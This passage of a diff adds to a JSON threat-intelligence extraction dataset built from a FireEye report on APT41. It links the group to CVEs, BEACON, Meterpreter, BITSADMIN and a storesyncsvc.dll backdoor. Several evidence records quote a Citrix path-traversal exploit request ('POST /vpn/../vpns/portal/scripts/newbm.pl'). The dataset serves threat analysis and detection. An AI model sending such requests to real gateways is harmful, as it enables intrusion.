+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb194"
+      },
+      "text": "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_195",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "rule_backfill",
+        "sentence_id": "p3_rb195"
+      },
+      "text": "POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_196",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb196"
+      },
+      "text": "2/13 POST /vpns/portal/scripts/newbm.pl HTTP/1.1 Host: [redacted] Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.22",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
+    {
+      "evidence_id": "ev_101",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_malware_BEACON",
+        "ent_malware_VMProtected_Meterpreter",
+        "ent_file_2.exe",
+        "ent_file_storescyncsvc.dll"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_28",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_malware_BEACON",
+        "ent_file_2.exe",
+        "ent_file_storescyncsvc.dll"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_73",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2019-1652",
+        "ent_cve_CVE-2019-1653",
+        "ent_victim_telecommunications_organization"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_81",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_malware_Storesyncsvc",
+        "ent_cve_CVE-2020-10189",
+        "ent_malware_storesyncsvc.dll",
+        "ent_file_install.bat",
+        "ent_file_logger.zip"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_27",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_malware_BEACON",
+        "ent_malware_Storesyncsvc",
+        "ent_malware_storesyncsvc.dll"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_98",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_malware_BEACON",
+        "ent_malware_Storesyncsvc",
+        "ent_malware_storesyncsvc.dll"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_63",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2019-19781"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_22",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_malware_Storesyncsvc",
+        "ent_cve_CVE-2020-10189",
+        "ent_file_install.bat",
+        "ent_file_logger.zip"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_16",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_cve_CVE-2019-1652",
+        "ent_cve_CVE-2019-1653"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_29",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_malware_BEACON",
+        "ent_malware_VMProtected_Meterpreter",
+        "ent_file_2.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_67",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2019-19781"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_47",
+      "page": 9,
+      "candidate_entity_ids": [
+        "ent_cve_CVE-2019-19781",
+        "ent_cve_CVE-2020-10198"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_89",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_malware_BEACON",
+        "ent_malware_Storesyncsvc",
+        "ent_malware_storesyncsvc.dll",
+        "ent_file_install.bat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_24",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_malware_BITSADMIN",
+        "ent_file_install.bat"
+      ],
+      "rule_relation_count": 2,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_57",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2019-19781"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_15",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_victim_telecommunications_organization"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_137",
+      "page": 10,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_malware_BEACON",
+        "ent_file_loader_X86_svchost.dll"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_192",
+      "page": 11,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_malware_BEACON",
+        "ent_url_https_github.com_libtom_libtomcrypt"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_21",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_malware_Storesyncsvc",
+        "ent_malware_storesyncsvc.dll",
+        "ent_file_install.bat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_185",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_campaign_Host",
+        "ent_domain_cdn.bootcss.com",
+        "ent_url_http_cdn.bootcss.com_"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_38",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2019-3396"
+      ],
+      "rule_relation_count": 1,
+      "llm_relation_count": 1
+    },
+    {
+      "evidence_id": "ev_100",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_malware_VMProtected_Meterpreter",
+        "ent_file_2.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_190",
+      "page": 11,
+      "candidate_entity_ids": [
+        "ent_malware_BEACON",
+        "ent_url_https_github.com_libtom_libtomcrypt"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_41",
+      "page": 8,
+      "candidate_entity_ids": [
+        "ent_malware_Storesyncsvc",
+        "ent_cve_CVE-2020-10189",
+        "ent_malware_storesyncsvc.dll",
+        "ent_file_install.bat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_43",
+      "page": 8,
+      "candidate_entity_ids": [
+        "ent_malware_BITSADMIN",
+        "ent_file_BITSADMIN.EXE",
+        "ent_tool_BITSADMIN.EXE",
+        "ent_file_Certutil.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_119",
+      "page": 8,
+      "candidate_entity_ids": [
+        "ent_malware_BITSADMIN",
+        "ent_file_BITSADMIN.EXE",
+        "ent_tool_BITSADMIN.EXE",
+        "ent_file_java.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_196",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_campaign_Accept-Encoding",
+        "ent_campaign_Connection",
+        "ent_campaign_Host"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_84",
+      "page": 4,
+      "candidate_entity_ids": [
+        "ent_malware_Storesyncsvc",
+        "ent_malware_storesyncsvc.dll",
+        "ent_file_install.bat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_121",
+      "page": 8,
+      "candidate_entity_ids": [
+        "ent_malware_BITSADMIN",
+        "ent_file_BITSADMIN.EXE",
+        "ent_tool_BITSADMIN.EXE"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_5",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2019-19781"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_58",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2019-19781"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_59",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_cve_CVE-2019-19781"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_102",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_campaign_Connection",
+        "ent_campaign_Host"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_115",
+      "page": 8,
+      "candidate_entity_ids": [
+        "ent_malware_Storesyncsvc",
+        "ent_malware_storesyncsvc.dll"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_189",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_threatactor_APT41",
+        "ent_url_http_example.com_title_"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_99",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_malware_VMProtected_Meterpreter",
+        "ent_file_2.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_183",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_campaign_Host",
+        "ent_domain_cdn.bootcss.com"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_42",
+      "page": 8,
+      "candidate_entity_ids": [
+        "ent_file_2.exe",
+        "ent_file_Certutil.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
